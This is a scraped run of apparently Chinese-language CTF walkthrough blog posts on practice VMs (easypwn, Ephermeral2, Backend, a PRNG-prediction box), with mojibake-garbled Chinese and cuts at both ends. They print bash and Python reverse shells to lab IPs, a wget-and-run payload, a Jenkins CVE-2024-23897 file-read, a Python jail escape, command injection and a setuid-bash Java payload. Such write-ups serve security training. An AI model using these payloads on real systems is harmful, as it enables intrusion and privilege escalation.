std::ifstream::rdbuf(v13);\rstd::ostream::operator\u0026lt;\u0026lt;(\u0026amp;std::cout, v11);\r}\rstd::ifstream::~ifstream(v13);\r}\rv8 = 0;\rstd::string::~string(v15);\r}\relse\r{\rv4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cerr, \u0026#34;Usage: \u0026#34;, envp);\rv5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v4, *argv, v4);\rv7 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v5, \u0026#34; \u0026lt;magic_number\u0026gt;\u0026#34;, v6);\rstd::ostream::operator\u0026lt;\u0026lt;(v7, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;);\rreturn 1;\r}\rreturn v8;\r} æ˜¯éšæœºæ•°çš„ç§å­è®¾ç½®é—®é¢˜ï¼Œå¯¼è‡´éšæœºæ•°å¯ä»¥é¢„æµ‹\nåˆ©ç”¨æ€è·¯ï¼š\næ”»å‡»è€…è·å–ç¨‹åºè¿è¡Œæ—¶é—´ï¼ˆç²¾ç¡®åˆ°ç§’ï¼‰ï¼Œç”Ÿæˆç›¸åŒéšæœºåºåˆ—è®¡ç®—**v16**ã€‚\næ„é€ å‚æ•°**argv[1]**ä¸º**v16 + 12345**ï¼Œè§¦å‘æ–‡ä»¶è¯»å–é€»è¾‘ã€‚\nå¯ä»¥å†™ä¸€ä¸ªCè¯­è¨€ç¨‹åºæ¥è¿›è¡Œé¢„æµ‹éšæœºæ•°\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\r#include \u0026lt;math.h\u0026gt;\rdouble generate_normal_distribution(void) {\rdouble v0; // ç”¨äºå­˜å‚¨å¯¹æ•°å€¼\rdouble v2; // ç”¨äºå­˜å‚¨å¹³æ–¹æ ¹å€¼\rdouble v3; // ç”¨äºç”Ÿæˆè§’åº¦çš„éšæœºæ•°\rdouble x; // ç”¨äºç”Ÿæˆå¯¹æ•°å€¼çš„éšæœºæ•°\rx = (double)rand() / 2147483647.0;\rv3 = (double)rand() / 2147483647.0;\rv0 = log(x);\rv2 = sqrt(-2.0 * v0);\rreturn cos(6.283185307179586 * v3) * v2;\r}\rint main() {\r// è®¾ç½®éšæœºæ•°ç§å­\rsrand(time(NULL));\r// ç”Ÿæˆéšæœºæ•°\rint v21 = rand() % 86400; // éšæœºèŒƒå›´åœ¨ 0 åˆ° 86399 ä¹‹é—´\rdouble normal_value = generate_normal_distribution(); // ç”Ÿæˆæ­£æ€åˆ†å¸ƒéšæœºæ•°\r// è®¡ç®— v16\rint v16 = (int)(5.0 * normal_value) + v21;\r// é™åˆ¶ v16 åœ¨ 0 åˆ° 86399 ä¹‹é—´\rif (v16 \u0026lt; 0) {\rv16 = 0;\r} else if (v16 \u0026gt; 86399) {\rv16 = 86399;\r}\r// è¾“å‡º v16\rprintf(\u0026#34;%d\\n\u0026#34;, v16+12345);\rreturn 0;\r} æˆ‘è¿™é‡Œæ˜¯åœ¨ç›®æ ‡é¶æœºä¸Šç¼–è¯‘çš„ï¼Œä½¿ç”¨gccä¼šæŠ¥é”™ï¼Œå¾—ç”¨g++\nè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œè¯»å–**/root/credä»ç„¶éœ€è¦ä»¥rootçš„èº«ä»½ï¼Œä¸‹é¢çš„æˆ‘åœ¨æœ¬åœ°æµ‹è¯•çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¯´ä»ç„¶éœ€è¦å¾—åˆ°lamb**çš„å¯†ç \nåœ¨è¿™ä¸ªç›®å½•ä¸‹å‘ç°ä¸€ä¸ªç•™è¨€\nä¸‹è½½CUPPå¯†ç ç”Ÿæˆå™¨\nMebus/cupp: Common User Passwords Profiler (CUPP) ç„¶åç”Ÿæˆå­—å…¸\nä¸Šä¼ suForceè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç \nè¯»å–**/root/cred**\nå®é™…ä¸Šè¿™ä¸ªå“ˆå¸Œå€¼å¹¶ä¸éœ€è¦è§£å¯†ï¼Œç›´æ¥ç™»å½•å³å¯\nSummary #\rUserï¼šä¸‹è½½åˆ°å‹ç¼©åŒ…æ–‡ä»¶ï¼Œè¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ã€‚åç¼–è¯‘åæŸ¥çœ‹æºç ï¼Œå¯ä»¥å†™å…¥Shellcodeè¿›è¡Œåå¼¹ï¼Œå†™å…¥å¯†é’¥å¾—åˆ°lambç”¨æˆ·ã€‚\nRootï¼šå¯¹getrootè¿›è¡Œåç¼–è¯‘ï¼Œå­˜åœ¨éšæœºæ•°é¢„æµ‹æ¼æ´ï¼Œä½†éœ€è¦ä»¥Rootèº«ä»½è¿è¡Œæ‰èƒ½æ‹¿åˆ°credã€‚æ ¹æ®ç•™è¨€éœ€è¦ä½¿ç”¨cuppç”Ÿæˆå¯†ç å­—å…¸ï¼Œè·å¾—lambçš„ç”¨æˆ·å¯†ç ï¼Œæœ€åæˆåŠŸææƒã€‚\n","date":"2025-03-07","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-easypwn/","section":"Posts","summary":"","title":"HackMyVm-easypwn","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Ephemeral2 â¯ nmap 192.168.56.107 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 0a:cc:f1:53:7e:6b:31:2c:10:1e:6d:bc:01:b1:c3:a2 (RSA)\r| 256 cd:19:04:a0:d1:8a:8b:3d:3e:17:ee:21:5d:cd:6e:49 (ECDSA)\r|_ 256 e5:6a:27:39:ed:a8:c9:03:46:f2:a5:8c:87:85:44:9e (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 08:00:27:47:B9:0F (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required\r|_nbstat: NetBIOS name: EPHEMERAL, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown)\r| smb2-time: | date: 2025-03-07T16:30:22\r|_ start_date: N/A\r|_clock-skew: 7h59m57s Gobuster #\r[root@kali] /home/kali/Ephemeral2 â¯ gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 â\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.107\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/javascript (Status: 301) [Size: 321] [--\u0026gt; http://192.168.56.107/javascript/]\r/server-status (Status: 403) [Size: 279]\r/foodservice (Status: 301) [Size: 322] [--\u0026gt; http://192.168.56.107/foodservice/]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r=============================================================== å­˜åœ¨ä¸€ä¸ª**/foodservice**é¡µé¢\nEnumeration #\r[root@kali] /home/kali/Ephemeral2 â¯ enum4linux -a 192.168.56.107 æœ‰ä¸¤ä¸ªæœ¬åœ°ç”¨æˆ·ï¼šrandyå’Œralph\nå°è¯•çˆ†ç ´randyçš„å¯†ç ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯msfconsole\nå¾—åˆ°å¯†ç æ˜¯pogiako\nåœ¨è¿™é‡Œæˆ‘å°è¯•ä½¿ç”¨crackmapexec smb è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä½†æ˜¯å´å¤±è´¥äº†ï¼Œä¸ºä»€ä¹ˆï¼Ÿéš¾é“æ˜¯ä¸¤ä¸ªå·¥å…·çš„å·®å¼‚ï¼Œè¿˜æ˜¯è¯´SMBç‰ˆæœ¬çš„é—®é¢˜ï¼Ÿ\næš‚æ—¶ç•™åœ¨è¿™é‡Œï¼Œå› ä¸ºæˆ‘æœç´¢ä¸åˆ°ç›¸å…³ä¿¡æ¯ã€‚\nOwn Randy #\rè¿›å…¥SYSADMINç›®å½•ï¼Œä¸‹è½½æ–‡ä»¶\næŸ¥çœ‹smb.confé…ç½®\n[SYSADMIN]\rpath = /home/randy/SYSADMIN\rvalid users = randy\rbrowsable = yes\rwriteable = yes\rread only = no\rmagic script = smbscript.elf\rguest ok = no magic script = smbscript.elf\nè¿™ä¸ªé€‰é¡¹æŒ‡å®šäº†ä¸€ä¸ªåä¸º smbscript.elf çš„è„šæœ¬æ–‡ä»¶ï¼Œå®ƒå°†åœ¨è®¿é—®å…±äº«æ—¶ä½œä¸º \u0026ldquo;magic\u0026rdquo; è„šæœ¬è¿è¡Œã€‚è¯¥è„šæœ¬é€šå¸¸ç”¨äºç‰¹å®šçš„è‡ªåŠ¨åŒ–ä»»åŠ¡ï¼Œå¦‚èº«ä»½éªŒè¯ã€æƒé™æ§åˆ¶ç­‰ã€‚\nå› æ­¤å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„è„šæœ¬è¿›è¡Œåå¼¹Shell\n[root@kali] /home/kali/Ephemeral2 â¯ cat smbscript.elf bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.104/6666 0\u0026gt;\u0026amp;1\u0026#34; å°†è‡ªå·±çš„id_rsa.pubå†™å…¥åˆ°**/home/randy/.ssh/authorized_keysä¸­ï¼Œå†SSH**ç™»å½•\nåœ¨**/home/ralphä¸­å‘ç°user.txt**ä½†æ˜¯æ— æ³•è¯»å–ï¼\nOwn ralph #\ræŸ¥çœ‹å®šæ—¶ä»»åŠ¡å‘ç°ralphæ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡ssh.shè„šæœ¬\nrandy@ephemeral:/tmp$ cat /home/ralph/tools/ssh.sh #!/bin/bash\r/usr/bin/ssh -o \u0026#34;StrictHostKeyChecking no\u0026#34; ralph@localhost -i /home/ralph/.ssh/id_rsa è€Œrandyç”¨æˆ·å¯¹ä»¥ä¸‹æ–‡ä»¶å…·æœ‰å¯å†™æƒé™\n/etc/profile.d/ ç›®å½•ï¼šè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šåœ¨ ç”¨æˆ·ç™»å½•æ—¶ è¢«æ‰§è¡Œï¼ˆåŒ…æ‹¬ SSH ç™»å½•ï¼‰ã€‚æ–‡ä»¶é€šå¸¸ä¼šé…ç½®ä¸€äº›ç¯å¢ƒå˜é‡ã€å‘½ä»¤åˆ«åã€ç»ˆç«¯å¤–è§‚ç­‰ã€‚\nå› æ­¤å¯ä»¥å†™å…¥åå¼¹shellçš„è¯­å¥\nrandy@ephemeral:/usr/bin$ cat /etc/profile.d/bash_completion.sh # shellcheck shell=sh disable=SC1091,SC2039,SC2166\r# Check for interactive bash and that we haven\u0026#39;t already been sourced.\rif [ \u0026#34;x${BASH_VERSION-}\u0026#34; != x -a \u0026#34;x${PS1-}\u0026#34; != x -a \u0026#34;x${BASH_COMPLETION_VERSINFO-}\u0026#34; = x ]; then\r# Check for recent enough version of bash.\rif [ \u0026#34;${BASH_VERSINFO[0]}\u0026#34; -gt 4 ] || \\\r[ \u0026#34;${BASH_VERSINFO[0]}\u0026#34; -eq 4 -a \u0026#34;${BASH_VERSINFO[1]}\u0026#34; -ge 1 ]; then\r[ -r \u0026#34;${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\\r. \u0026#34;${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion\u0026#34;\rif shopt -q progcomp \u0026amp;\u0026amp; [ -r /usr/share/bash-completion/bash_completion ]; then\r# Source completion code.\r. /usr/share/bash-completion/bash_completion\rfi\rfi\rfi\rbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.104/6666 0\u0026gt;\u0026amp;1 å¾—åˆ°åå¼¹shellååŒæ ·å†™å…¥å…¬é’¥\nRoot #\ræŸ¥çœ‹ç‰¹æ®Šå‘½ä»¤\nralph@ephemeral:~$ sudo -l\rMatching Defaults entries for ralph on ephemeral:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser ralph may run the following commands on ephemeral:\r(root) NOPASSWD: /usr/bin/python3 /home/ralph/getfile.py æš‚æ—¶æ— æ³•ç›´æ¥æŸ¥çœ‹getfile.pyçš„å†…å®¹\nä¼¼ä¹ä»–æ˜¯åœ¨POSTä¼ é€’ä¸€ä¸ªä¸œè¥¿\nå°è¯•åœ¨è¾“å…¥å‚æ•°çš„æ—¶å€™æ·»åŠ å…¶ä»–å‘½ä»¤\nralph@ephemeral:~$ sudo /usr/bin/python3 /home/ralph/getfile.py File path: any IP address: any \u0026amp; /bin/bash -p æˆåŠŸè¿›å…¥åˆ°rootï¼\nSummary #\rUserï¼šenum4linuxæ‰«æåˆ°å­˜åœ¨randyç”¨æˆ·ï¼Œå¯¹å…¶è¿›è¡ŒSMBçˆ†ç ´ç™»å½•ï¼Œè¯»å–smbé…ç½®æ–‡ä»¶å¯ä»¥ä¸Šä¼ ä¸€ä¸ªé­”æœ¯è„šæœ¬ï¼Œåœ¨ç™»é™†æ—¶ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå› æ­¤å¾—åˆ°randyçš„æƒé™ã€‚æŸ¥çœ‹å®šæ—¶ä»»åŠ¡å¾—çŸ¥ï¼Œralphæ¯åˆ†é’Ÿä¼šæ‰§è¡Œä»–çš„sshè„šæœ¬ï¼ŒåŒæ—¶randyå¯ä»¥ä¿®æ”¹**/etc/profile.d/ä¸‹çš„sshç™»é™†åçš„é…ç½®æ–‡ä»¶ï¼Œä»è€Œå¾—åˆ°ralph**çš„æƒé™ã€‚\nRootï¼šralphæœ‰ä¸€ä¸ªæ— æ³•è¯»å–æºç ï¼Œä¼¼ä¹æ˜¯ä¼ ä¸€ä¸ªæ–‡ä»¶çš„è„šæœ¬ï¼Œé€šè¿‡å¯¹å‚æ•°çš„æ³¨å…¥ï¼Œå¾—åˆ°rootæƒé™ã€‚\n","date":"2025-03-07","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-ephermeral2/","section":"Posts","summary":"","title":"VulnVM-Ephermeral2","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Backend â¯ nmap 192.168.237.148 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 48:ec:8d:c2:a6:1e:52:43:62:44:29:36:58:73:15:6b (RSA)\r| 256 0d:39:f5:86:a1:fc:7d:ba:c6:55:14:37:2c:91:fe:37 (ECDSA)\r|_ 256 d6:91:b0:62:48:85:9c:51:dd:f9:20:35:d2:53:a6:25 (ED25519)\r8080/tcp open http Jetty 10.0.18\r|_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8).\r| http-robots.txt: 1 disallowed entry |_/\r|_http-server-header: Jetty(10.0.18)\rMAC Address: 00:0C:29:42:20:88 (VMware)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel CVE-2024-23897 #\rè¿›å…¥8080ç«¯å£å‘ç°æ˜¯ä¸€ä¸ªJenkinsçš„ç™»å½•é¡µé¢\nç»è¿‡æµ‹è¯•ï¼Œå¼±å£ä»¤å’ŒSQLæ³¨å…¥çš„æƒ…å†µå¹¶ä¸å­˜åœ¨\næœç´¢å¾—åˆ°ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´\nJenkins Security Advisory 2024-01-24 åœ¨ç½‘ä¸Šæ‰¾äº†ä¸¤ä¸ªè„šæœ¬\nxaitax/CVE-2024-23897: CVE-2024-23897 | Jenkins \u0026lt;= 2.441 \u0026amp; \u0026lt;= LTS 2.426.2 PoC and scanner.\nwjlin0/CVE-2024-23897: CVE-2024-23897 - Jenkins ä»»æ„æ–‡ä»¶è¯»å– åˆ©ç”¨å·¥å…·\nä½†æ˜¯éƒ½åªèƒ½è¯»å–åˆ°ä¸€è¡Œï¼Ÿï¼Ÿï¼Œæˆ‘æ‰¾æ‰¾å…¶ä»–çš„æ–¹æ³•\nå¯ä»¥è®¿é—®**/jnlpJars/jenkins-cli.jarä¸‹è½½åˆ°jaråŒ…ï¼Œæ ¹æ®vulnhub**é‡Œé¢çš„ä»‹ç»ï¼Œå°è¯•è¯»å–ä¸€ä¸‹ç™»å½•å¯†ç \nvulhub/jenkins/CVE-2024-23897 at master Â· vulhub/vulhub admin:da1c139ad3ba437184b29528e6f24098 æˆåŠŸç™»å½•åˆ°åå°ï¼Œç‰ˆæœ¬æ˜¯2.441\nOwn jenkins #\rè¿›å…¥åˆ°å‘½ä»¤æ‰§è¡Œçš„éƒ¨åˆ†\nå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤\nprintln \u0026#34;whoami\u0026#34;.execute().text\rprintln \u0026#34;cat /etc/passwd\u0026#34;.execute().text å°è¯•è¯»å–id_rsaå¯†é’¥ï¼Œå‘ç°æ²¡æœ‰\nprintln \u0026#34;ls -al /home/jenkins/.ssh/\u0026#34;.execute().text ä½†æ˜¯å¯ä»¥æŠŠæˆ‘ä»¬è‡ªå·±çš„å¯†é’¥åŠ åˆ°authorized_keyä¸­\nå…ˆåšä¸ªåå¼¹Shellå§ï¼Œè¿™é‡Œæ— æ³•ç›´æ¥åœ¨æ§åˆ¶å°ä¸­åå¼¹ï¼Œéœ€è¦ä¸Šä¼ ä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥å‚è€ƒğŸ‘‡\nJenkinsæœªæˆæƒè®¿é—®æ¼æ´å¤ç°ä¸ getshell åˆ©ç”¨æ–¹æ³•æ±‡æ€»_jenkins getshell-CSDNåšå®¢ #!/usr/bin/python\r# This is a Python reverse shell script\rimport socket,subprocess,os;\rs=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\rs.connect((\u0026#34;192.168.237.147\u0026#34;,6666));\ros.dup2(s.fileno(),0);\ros.dup2(s.fileno(),1);\ros.dup2(s.fileno(),2);\rp=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); ç„¶åä¸Šä¼ æ‰§è¡Œ\nprintln \u0026#34;wget http://192.168.237.147/revshell.py -P /tmp/\u0026#34;.execute().text\rprintln \u0026#34;python3 /tmp/revshell.py\u0026#34;.execute().text æˆåŠŸå¾—åˆ°åå¼¹shell\næ¥ä¸‹æ¥æ˜¯å°†æˆ‘ä»¬çš„å…¬é’¥æ·»åŠ åˆ°authorized_keysä¸­\nç„¶åæˆåŠŸä½¿ç”¨SSHç™»å½•\nOwn tranquil #\rå‘ç°å†…éƒ¨80ç«¯å£å¼€æ”¾äº†\nå¹¶ä¸”çœ‹åˆ°homeé‡Œçš„å¦ä¸€ä¸ªç”¨æˆ·æ‰€å±ç»„æ˜¯www-data\nå…ˆå°†ç«¯å£è½¬å‡ºæ¥\n[root@kali] /home/kali/easypwn â¯ ssh -i ~/.ssh/id_rsa jenkins@192.168.237.148 -L 8888:127.0.0.1:80 ç„¶åè®¿é—®**/uploadimages.php**ï¼Œæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç»ˆç«¯\nå½“å‰ç›®å½•æ²¡æœ‰å†™çš„æƒé™ï¼Œåå¼¹shellä¹Ÿå¤±è´¥ï¼Œå¯ä»¥catçœ‹çœ‹è¿™ä¸ªphpçš„æºç æ˜¯ä»€ä¹ˆ\nå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†escapeshellcmdå‡½æ•°ï¼Œä»¥ä¸‹è¿™äº›éƒ½ä¼šè¢«è¿‡æ»¤\n\\ \u0026#39; \u0026#34; $ ; \u0026amp; | \u0026lt; \u0026gt;`ã€‚ å› æ­¤åªèƒ½å°è¯•è¯»å–æ–‡ä»¶äº†\nls /home/tranquil/backup -al åˆšå¥½å‘ç°äº†ç§é’¥ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨æ¥ç™»å½•\nRoot #\ræŸ¥çœ‹ç‰¹æ®Šå‘½ä»¤\ntranquil@backend:~$ sudo -l\rMatching Defaults entries for tranquil on backend:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser tranquil may run the following commands on backend:\r(ALL) NOPASSWD: /usr/bin/java å‡†å¤‡ä¸€ä¸ªæ¶æ„çš„javaä»£ç \nimport java.io.IOException;\rpublic class evil {\rpublic static void main(String[] args) throws IOException {\rRuntime.getRuntime().exec(\u0026#34;chmod u+s /bin/bash\u0026#34;);\r}\r} ç„¶åæ‰“åŒ…æˆjaråŒ…\nç„¶åæ‰§è¡Œå³å¯æ‹¿åˆ°rootæƒé™\nSummary #\rUserï¼šé€šè¿‡Jenkinsçš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè·å¾—é»˜è®¤çš„ç®¡ç†å‘˜å¯†ç ã€‚è¿›å…¥åˆ°åå°çš„å‘½ä»¤æ§åˆ¶å°ï¼Œæ‰§è¡Œåå¼¹Shellï¼Œå†™å…¥å…¬é’¥ç™»å½•æ‹¿åˆ°jenkinsç”¨æˆ·çš„æƒé™ã€‚å°†å†…ç½‘ç«¯å£è½¬å‘å‡ºæ¥ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„PHPæ–‡ä»¶ï¼Œç”±äºtranquilçš„ç›®å½•é…ç½®é—®é¢˜ï¼Œè¯»å–åˆ°ä»–çš„ç§é’¥ï¼Œä»è€Œè·å–åˆ°tranquilçš„æƒé™ã€‚\nRootï¼štranquilèƒ½ä»¥rootçš„èº«ä»½è¿è¡Œjavaå‘½ä»¤ï¼Œå› æ­¤å¯ä»¥æ„é€ æ¶æ„javaä»£ç æ¥ææƒã€‚\n","date":"2025-03-05","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-backend/","section":"Posts","summary":"","title":"VulnVM-Backend","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\rä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰«å¾—å¾ˆæ…¢ï¼Œè¿™é‡Œå°±ç®€ç•¥ä¸€ç‚¹\n[root@kali] /home/kali/predictable â¯ nmap 172.17.0.2 -p- PORT STATE SERVICE\r22/tcp open ssh\r1111/tcp open lmsocialserver Crack Number #\rè®¿é—®1111ç«¯å£ï¼Œåœ¨æºä»£ç ä¸­å¾—åˆ°ä¿¡æ¯\nä¼¼ä¹æ˜¯è¿™ä¸ªéšæœºæ•°åˆ—è¡¨çš„ç”Ÿæˆé€»è¾‘\nclass prng_lcg:\rm = c =\rn = 9223372036854775783\rdef __init__(self, seed=None):\rself.state = seed\rdef next(self):\rself.state = (self.state * self.m + self.c) % self.n\rreturn self.state\r...\r# return int\rdef obtener_semilla():\rreturn time.time_ns()\rdef obtener_semilla_anterior():\rreturn obtener_semilla() - 1\r...\rif \u0026#39;seed\u0026#39; not in session:\rsession[\u0026#39;seed\u0026#39;] = obtener_semilla()\rgen = prng_lcg(session[\u0026#39;seed\u0026#39;])\r...\rgen = prng_lcg(session[\u0026#39;seed\u0026#39;])\rsemilla_anterior = obtener_semilla_anterior()\r... é€†å‘ç ´è§£çº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼ˆLCGï¼‰çš„å‚æ•° m å’Œ c æ˜¯å¯è¡Œçš„ï¼Œä½†éœ€è¦ä¸€äº›å·²çŸ¥çš„è¾“å‡ºå€¼æ¥è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†99ä¸ªå‚æ•°ï¼Œå› æ­¤å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬è®¡ç®—\nimport requests\rfrom bs4 import BeautifulSoup\rfrom collections import Counter\r# æ­£ç¡®å®šä¹‰LCGçš„æ¨¡æ•°\rMODULUS = 9223372036854775783\rdef extract_numbers(url):\rresponse = requests.get(url)\rsoup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;)\rsecond_td_numbers = []\rfor tr in soup.find_all(\u0026#39;tr\u0026#39;):\rtds = tr.find_all(\u0026#39;td\u0026#39;)\rif len(tds) \u0026gt; 1:\rsecond_td_numbers.append(int(tds[1].text))\rfiltered_numbers = [num for num in second_td_numbers if num \u0026gt; 100]\rreturn filtered_numbers\rdef find_lcg_parameters(random_numbers):\rif len(random_numbers) \u0026lt; 3:\rraise ValueError(\u0026#34;éœ€è¦è‡³å°‘ä¸‰ä¸ªè¿ç»­æ•°å­—æ¥æ¨å¯¼å‚æ•°\u0026#34;)\r# è®¡ç®—ç›¸é‚»æ•°å­—çš„å·®å€¼\rdeltas = [\r(random_numbers[i] - random_numbers[i - 1]) % MODULUS\rfor i in range(1, len(random_numbers))\r]\rm_candidates = []\rfor i in range(1, len(random_numbers) - 1):\rtry:\r# è®¡ç®—è¿ç»­å·®å€¼çš„å…³ç³»\rt1 = deltas[i] # s_{i+1} - s_i\rt0 = deltas[i - 1] # s_i - s_{i-1}\r# è®¡ç®—æ¨¡é€†å…ƒå¹¶æ¨å¯¼m\rinv = mod_inverse(t0, MODULUS)\rm = (t1 * inv) % MODULUS\rm_candidates.append(m)\rexcept ValueError:\rcontinue # è·³è¿‡æ— æ³•è®¡ç®—é€†å…ƒçš„æƒ…å†µ\rif not m_candidates:\rraise ValueError(\u0026#34;æ— æ³•ç¡®å®šmå€¼ï¼Œå¯èƒ½éœ€è¦æ›´å¤šæ•°æ®\u0026#34;)\r# ç»Ÿè®¡æ‰¾åˆ°æœ€å¯èƒ½çš„må€¼\rm = Counter(m_candidates).most_common(1)[0][0]\r# æ¨å¯¼cå€¼\rc = (random_numbers[1] - random_numbers[0] * m) % MODULUS\rreturn m, c\rdef extended_gcd(a, b):\rif a == 0:\rreturn (b, 0, 1)\rgcd, x1, y1 = extended_gcd(b % a, a)\rx = y1 - (b // a) * x1\ry = x1\rreturn (gcd, x, y)\rdef mod_inverse(a, m):\rgcd, x, y = extended_gcd(a, m)\rif gcd != 1:\rraise ValueError(\u0026#34;æ¨¡é€†å…ƒä¸å­˜åœ¨\u0026#34;)\rreturn x % m\r# æ‰§è¡Œç¨‹åº\rif __name__ == \u0026#34;__main__\u0026#34;:\rtarget_url = \u0026#34;http://172.17.0.2:1111\u0026#34;\rnumbers = extract_numbers(target_url)\rtry:\rm, c = find_lcg_parameters(numbers)\rprint(f\u0026#34;æˆåŠŸç ´è§£å‚æ•°: m={m}, c={c}\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;é”™è¯¯: {str(e)}\u0026#34;) m=81853448938945944\rc=7382843889490547368 æ¥ä¸‹æ¥å°±è¦é¢„æµ‹ç¬¬ä¸€ç™¾ä¸ªå‚æ•°ï¼Œç”±äºåœ¨æºç ä¸­å·²ç»çŸ¥é“äº†nextçš„ç”Ÿæˆé€»è¾‘ï¼Œå› æ­¤ç›´æ¥ä½¿ç”¨å°±å¥½äº†\nprint( ( number_99 * m + c ) % n ) æˆåŠŸå¾—åˆ°å‡­è¯\nPyjail #\rè¿™é‡Œæˆ‘è¿‡æ»¤äº†importã€osç­‰ï¼Œå¯ä»¥ä½¿ç”¨**+å·æ‹¼æ¥å­—ç¬¦ä¸²ç»•è¿‡ï¼Œæˆ‘åœ¨ç½‘ä¸Šéšä¾¿æ‰¾äº†ä¸€ä¸ªpayload**\n[ x.__init__.__globals__ for x in \u0026#39;\u0026#39;.__class__.__base__.__subclasses__() if x.__name__==\u0026#34;_wrap_clo\u0026#34;+\u0026#34;se\u0026#34;][0][\u0026#34;sys\u0026#34;+\u0026#34;tem\u0026#34;](\u0026#34;id\u0026#34;) è¿›å…¥shellåªéœ€è¦å¼€å¯ä¸€ä¸ªbashå°±è¡Œäº†\n[ x.__init__.__globals__ for x in \u0026#39;\u0026#39;.__class__.__base__.__subclasses__() if x.__name__==\u0026#34;_wrap_clo\u0026#34;+\u0026#34;se\u0026#34;][0][\u0026#34;sys\u0026#34;+\u0026#34;tem\u0026#34;](\u0026#34;/bin/bash -p\u0026#34;) Root #\rMethod 1 #\ræŸ¥çœ‹ç‰¹æ®Šå‘½ä»¤\nmash@predictable:~$ sudo -l\rMatching Defaults entries for mash on predictable:\renv_reset, mail_badpass, 